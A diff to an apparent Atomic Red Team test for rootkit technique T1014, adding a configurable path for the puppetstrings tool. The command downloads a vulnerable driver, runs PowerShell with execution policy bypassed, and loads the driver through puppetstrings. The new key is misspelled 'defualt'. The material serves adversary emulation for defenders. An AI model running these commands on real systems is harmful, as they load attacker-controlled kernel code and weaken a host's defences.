@@ -61,9 +61,13 @@ atomic_tests:
       description: Path to the vulnerable driver
       type: Path
       default: '%TEMP%\driver.sys'
+    puppetstrings_path:
+      description: Path to puppetstrings.exe
+      type: Path
+      defualt: C:\AtomicRedTeam\atomics\T1014\bin\puppetstrings
       
   executor:
     name: command_prompt
     command: |
       echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr -Uri #{capcom_uri} -OutFile #{driver_path} | powershell -ExecutionPolicy Bypass -Command -
-      C:\AtomicRedTeam\atomics\T1014\bin\puppetstrings #{driver_path}
+      #{puppetstrings_path} #{driver_path}
